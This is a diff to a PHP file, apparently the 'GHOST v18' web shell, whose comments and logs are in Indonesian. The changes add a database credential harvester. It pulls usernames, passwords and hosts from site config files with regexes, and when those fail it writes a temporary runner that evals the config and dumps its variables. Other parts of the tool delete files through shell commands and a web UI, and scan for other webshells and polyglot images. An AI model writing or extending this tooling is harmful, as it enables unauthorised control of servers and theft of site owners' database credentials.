@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0..6: Full UI, Advanced DB Parser.
+// GHOST v18 - section 0..6: Advanced DB Parser (Include), Deep Scanner UI.
 
-define('GH_VER',      '18.0.0-final-2');
+define('GH_VER',      '18.0.0-sultan');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -202,7 +202,7 @@ function gh_del($path) {
     $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
 }
 
-// ==== SECTION 3: SCANNER ====================================================
+// ==== SECTION 3: SCANNER (DEEP & UI) ========================================
 function gh_scan_batch($root, $offset = 0, $limit = 50) {
     $res = array('files' => array(), 'done' => false, 'total' => 0);
     $all_files = array(); $stack = array($root);
@@ -230,18 +230,18 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
         $c = gh_read($path, 1048576);
         $size = @filesize($path);
         $ext = @strtolower(pathinfo($path, PATHINFO_EXTENSION));
-        $findings = array(); $type = '';
+        $findings = array(); $type = ''; $desc = '';
         
         if ($size === 0 && in_array($ext, array('php','phtml'))) { 
-            $type = 'Empty Shell'; $findings[] = "0-byte file."; 
+            $type = 'Empty Shell'; $desc = 'File 0-byte (Backdoor gagal upload).'; 
         } elseif (is_string($c) && (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false)) { 
-            $type = 'Obfuscated RCE'; $findings[] = "eval()/assert() terdeteksi."; 
+            $type = 'Obfuscated RCE'; $desc = 'Menggunakan eval()/assert() untuk mengeksekusi kode dinamis.'; 
         } elseif (is_string($c) && preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) { 
-            $type = 'Direct Webshell'; $findings[] = "Eksekusi shell via HTTP."; 
+            $type = 'Direct Webshell'; $desc = 'Mengeksekusi shell dari parameter HTTP secara langsung.'; 
         } elseif (in_array($ext, array('jpg','jpeg','png','gif')) && is_string($c) && stripos($c, '<?php') !== false) {
-            $type = 'Polyglot Malware'; $findings[] = "Gambar disisipi PHP.";
+            $type = 'Polyglot Malware'; $desc = 'Gambar yang disisipi kode PHP (Bypass upload).';
         } elseif (!$ext && is_string($c) && stripos($c, '<?php') !== false) {
-            $type = 'Hidden PHP'; $findings[] = "Tanpa ekstensi tapi PHP.";
+            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi tapi berisi kode PHP.';
         }
         
         $found_kw = array();
@@ -249,11 +249,11 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
             foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
         }
         if ($found_kw) { 
-            if($type === '') $type = 'Illegal Content'; 
-            $findings[] = "Keyword: " . implode(', ', $found_kw); 
+            if($type === '') { $type = 'Illegal Content'; $desc = 'Konten judi/porno/ilegal terdeteksi.'; }
+            $desc .= ' Keyword: ' . implode(', ', $found_kw); 
         }
         
-        if ($type !== '') $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => implode(' | ', $findings));
+        if ($type !== '') $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc);
     }
     return $res;
 }
@@ -317,31 +317,59 @@ function gh_db_harvest() {
         if ($c) {
             $logs[] = "[+] Config ditemukan: $cf";
             
-            // Advanced Parser:
-            // 1. Coba pola array: $db['user'] = 'xxx' / $config['username'] = 'xxx'
+            // --- TAHAP 1: EKSTRAKSI MANUAL (REGEX) ---
             if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = $m[1];
-            // 2. Coba pola define: define('DB_USER', 'xxx')
             elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = $m[1];
-            // 3. Coba pola assign: $user = 'xxx'
             elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
 
-            // Pass
             if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = $m[1];
             elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = $m[1];
             elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];
 
-            // Host
             if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = $m[1];
             elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = $m[1];
             elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];
 
             if ($db_user && $db_pass) {
-                $logs[] = "[+] BERHASIL mengekstrak kredensial dari config!";
+                $logs[] = "[+] BERHASIL mengekstrak kredensial via REGEX!";
                 break;
-            } else {
-                // Kalau gagal ekstrak, tampilin preview 3 baris pertama biar user tau formatnya
-                $preview = substr(trim($c), 0, 150);
-                $logs[] = "    [-] Gagal parsing otomatis. Preview: " . str_replace("\n", " ", $preview) . "...";
+            } 
+            
+            // --- TAHAP 2: INCLUDE PHP (MAGIC) ---
+            // Kalau regex gagal, kita paksa PHP-nya include config-nya, lalu ambil variabel globalnya.
+            $logs[] = "[*] Regex gagal, mencoba Include PHP untuk membaca variabel...";
+            $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
+            $runner = $tmp_dir . '/gh_incl_' . rand(1000,9999) . '.php';
+            $runner_code = '<?php $GLOBALS["__gh_out"] = array(); $__c = file_get_contents("' . addslashes($cf) . '"); if ($__c) { eval("?>" . $__c); $GLOBALS["__gh_out"] = get_defined_vars(); } echo json_encode($GLOBALS["__gh_out"]); ?>';
+            
+            if (gh_write($runner, $runner_code)) {
+                $out = gh_exec_adv('php ' . @escapeshellarg($runner));
+                if (isset($out['out']) && is_string($out['out'])) {
+                    $json = @json_decode($out['out'], true);
+                    if (is_array($json)) {
+                        foreach ($json as $k => $v) {
+                            if (is_array($v)) {
+                                foreach ($v as $kk => $vv) {
+                                    if (is_string($vv)) {
+                                        if (preg_match('/user|username/i', $kk) && !$db_user) $db_user = $vv;
+                                        if (preg_match('/pass|password/i', $kk) && !$db_pass) $db_pass = $vv;
+                                        if (preg_match('/host|hostname/i', $kk) && $db_host === 'localhost') $db_host = $vv;
+                                    }
+                                }
+                            } elseif (is_string($v)) {
+                                if (preg_match('/user|username/i', $k) && !$db_user) $db_user = $v;
+                                if (preg_match('/pass|password/i', $k) && !$db_pass) $db_pass = $v;
+                                if (preg_match('/host|hostname/i', $k) && $db_host === 'localhost') $db_host = $v;
+                            }
+                        }
+                    }
+                }
+                @unlink($runner);
+            }
+            
+            if ($db_user && $db_pass) {
+                $logs[] = "[+] BERHASIL mengekstrak kredensial via PHP INCLUDE!";
+                break;
             }
         }
     }
@@ -735,9 +763,33 @@ async function startScan() {
 }
 function renderScan(mal) {
     if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p class="dim">Clean.</p>'; return; }
-    let h = `<table><tr><th>Type</th><th>File</th><th>Analysis</th></tr>`;
-    mal.forEach(x => h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td></tr>`);
+    let h = `<table><tr><th>Type & Desc</th><th>File</th><th>Aksi</th></tr>`;
+    mal.forEach(x => {
+        let enc = encodeURIComponent(x.path);
+        h += `<tr>
+            <td><span class="badge">${esc(x.type)}</span><br><span class="dim" style="font-size:11px;">${esc(x.desc)}</span></td>
+            <td>${esc(x.path)}</td>
+            <td>
+                <button onclick="viewFileScan('${enc}')" style="border-color:#0f0;color:#0f0; padding:2px 5px; font-size:11px;">View</button>
+                <button onclick="delFileScan('${enc}')" style="border-color:#f00;color:#f00; padding:2px 5px; font-size:11px;">Del</button>
+            </td>
+        </tr>`;
+    });
     h += `</table>`; document.getElementById('scan-results').innerHTML = h;
+}
+
+function viewFileScan(enc) {
+    const p = decodeURIComponent(enc);
+    document.getElementById('f-path').value = p;
+    switchTab('tab-term', document.getElementById('btn-tab-term'));
+    readFile();
+}
+
+async function delFileScan(enc) {
+    const p = decodeURIComponent(enc);
+    if(!confirm('Hapus file ' + p + '?')) return;
+    await api('delete', {path:p});
+    startScan(); // refresh
 }
 
 async function dbHarvest() {
